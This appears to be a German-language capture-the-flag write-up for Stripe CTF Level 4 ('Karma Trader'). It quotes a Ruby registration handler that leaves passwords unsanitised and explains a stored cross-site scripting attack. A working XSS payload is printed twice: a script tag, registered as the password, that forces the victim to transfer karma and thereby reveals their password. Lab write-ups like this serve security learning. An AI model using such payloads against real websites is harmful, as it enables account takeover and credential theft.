LEVEL 04
========

params[:password] not escaped and checked
XSS vulnerability, user karma_fountain logs in every minute... use to
send yourself karma to see his password

    <script type='text/javascript'>$.ajax({ url: document.location +
    'transfer', type: 'POST', data: { to: 'a', amount: '100' }});</script>.

---

The Karma Trader is the world's best way to reward people for good deeds: https://level04-4.stripe-ctf.com/user-XXXX. You can sign up for an account, and start transferring karma to people who you think are doing good in the world. In order to ensure you're transferring karma only to good people, transferring karma to a user will also reveal your password to him or her.

The very active user karma_fountain has infinite karma, making it a ripe account to obtain (no one will notice a few extra karma trades here and there). The password for karma_fountain's account will give you access to Level 5.

You can obtain the full, runnable source for the Karma Trader from git clone https://level04-4.stripe-ctf.com/user-XXXX/level04-code. We've included the most important files below.

----

Interessant, dass sich der User karma_fountain jede Minute einloggt, oder? Außerdem ist es wohl ein lustiges Verhalten, dass das eigene Passwort dem Karma-Empfänger angezeigt wird...

    post '/register' do
          username = params[:username]
          password = params[:password]
          unless username && password
            die("Please specify both a username and a password.", :register)
          end

          unless username =~ /^\w+$/
            die("Invalid username. Usernames must match /^\w+$/", :register)
          end

          unless DB.conn[:users].where(:username => username).count == 0
            die("This username is already registered. Try another one.",
                :register)
          end

          DB.conn[:users].insert(
            :username => username,
            :password => password,
            :karma => STARTING_KARMA,
            :last_active => Time.now.utc
            )
          session[:user] = username
          redirect '/'
        end

Die interesse Stelle oben lässt erkennen, dass hier der Username durch eine Regular Expression validiert wird, dass Passwort jedoch nicht! Oh. Und das Passwort wird ja jedem Empfänger angezeigt?! Spricht für eine wunderbare Cross Site Scripting Vulnerability.

      <script type='text/javascript'>$.ajax({ url: document.location +
    'transfer', type: 'POST', data: { to: 'a', amount: '100' }});</script>

Packen wir also das kurze, oben stehende Script bei der Registrierung als Passwort in unseren Account und überweisen der karma_fountain danach etwas Karma, so wird beim nächsten Aufruf durch die karma_fountain eben jenes Script ausgeführt. Das Teil sendet also dem User a Karma - und natürlich das Passwort!